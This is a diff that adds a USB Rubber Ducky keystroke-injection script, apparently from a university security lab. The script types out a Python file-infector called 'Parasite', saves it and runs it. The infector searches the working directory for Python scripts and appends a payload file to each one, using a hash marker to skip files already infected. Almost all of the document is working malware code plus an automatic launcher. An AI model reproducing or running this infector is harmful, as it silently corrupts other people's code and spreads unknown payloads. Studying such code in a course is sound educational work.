@@ -1,0 +1,151 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 500
+STRING import os
+ENTER
+STRING from FileOperations import FileOperations
+ENTER
+ENTER
+STRING class IdentifyTarget:
+ENTER
+STRING     def __init__(self, file):
+ENTER
+STRING         self.file = file
+ENTER
+ENTER
+STRING     def is_script(self):
+ENTER
+STRING         try:
+ENTER
+STRING             required_statement = 'if __name__ == "__main__":'
+ENTER
+STRING             if required_statement in FileOperations.read(self.file):
+ENTER
+STRING                 return True
+ENTER
+STRING             print(f"Could not verify file {self.file} is python script; no {required_statement} statement.\n")
+ENTER
+STRING             return False
+ENTER
+STRING         except FileNotFoundError:
+ENTER
+STRING             print(f"File {self.file} not found.\n")
+ENTER
+STRING             return False
+ENTER
+ENTER
+STRING     def is_infected(self):
+ENTER
+STRING         id = "# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d"
+ENTER
+STRING         try:
+ENTER
+STRING             if id in FileOperations.read(self.file):
+ENTER
+STRING                 print(f"File {self.file} is already infected.")
+ENTER
+STRING                 return True
+ENTER
+STRING             return False
+ENTER
+STRING         except FileNotFoundError:
+ENTER
+STRING             print(f"File {self.file} not found.\n")
+ENTER
+STRING             return False
+ENTER
+ENTER
+STRING     def is_verified(self):
+ENTER
+STRING         if self.is_script() and not self.is_infected():
+ENTER
+STRING             return 1
+ENTER
+STRING         print(f"Verification of {self.file} failed.\nQuitting...\n")
+ENTER
+STRING         return 0
+ENTER
+ENTER
+STRING class Parasite:
+ENTER
+STRING     def __init__(self, target_file=None, payload_file=None, output_path=None):
+ENTER
+STRING         self.target_file = target_file
+ENTER
+STRING         self.payload_file = payload_file
+ENTER
+STRING         self.output_path = output_path
+ENTER
+ENTER
+STRING         FileOperations.clear(self.output_path)
+ENTER
+ENTER
+STRING     def getPyFiles(self):
+ENTER
+STRING         cwd = os.getcwd()
+ENTER
+STRING         for root, dir, files in os.walk(cwd):
+ENTER
+STRING             for file in files:
+ENTER
+STRING                 if file.endswith(".py"):
+ENTER
+STRING                     FileOperations.append_to(self.output_path, f"{file}\n")
+ENTER
+ENTER
+STRING     def inject(self, file=None):
+ENTER
+STRING         if file is None: file = self.target_file
+ENTER
+STRING         verified = IdentifyTarget(file).is_verified()
+ENTER
+STRING         if not verified: return 1
+ENTER
+STRING         print(f"Injecting {file}...\n")
+ENTER
+STRING         FileOperations.append_to(file, f"\n# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d\n{FileOperations.read(self.payload_file)}")
+ENTER
+STRING         return 0
+ENTER
+ENTER
+STRING     def inject_all(self):
+ENTER
+STRING         self.getPyFiles()
+ENTER
+STRING         cwd_targets = FileOperations.read(self.output_path).split("\n")
+ENTER
+STRING         cwd_targets.pop()
+ENTER
+STRING         print(cwd_targets)
+ENTER
+STRING         for py_file in cwd_targets:
+ENTER
+STRING             print(py_file)
+ENTER
+STRING             if py_file != "Parasite.py":
+ENTER
+STRING                 injection_status = self.inject(py_file)
+ENTER
+STRING                 if injection_status == 0:
+ENTER
+STRING                     print(f"{py_file} infected.")
+ENTER
+STRING Parasite(output_path="Q1C.out", payload_file="Q1C_payload.py").inject_all()
+ENTER
+CTRL s
+DELAY 300
+STRING C:\Users\tjn43\OneDrive\Documents\UCONN Work\sophomore2\CSE-3140\lab2\Q5.py
+ENTER
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING cd "C:\Users\tjn43\OneDrive\Documents\UCONN Work\sophomore2\CSE-3140\lab2"
+ENTER
+STRING python Q5.py
+ENTER
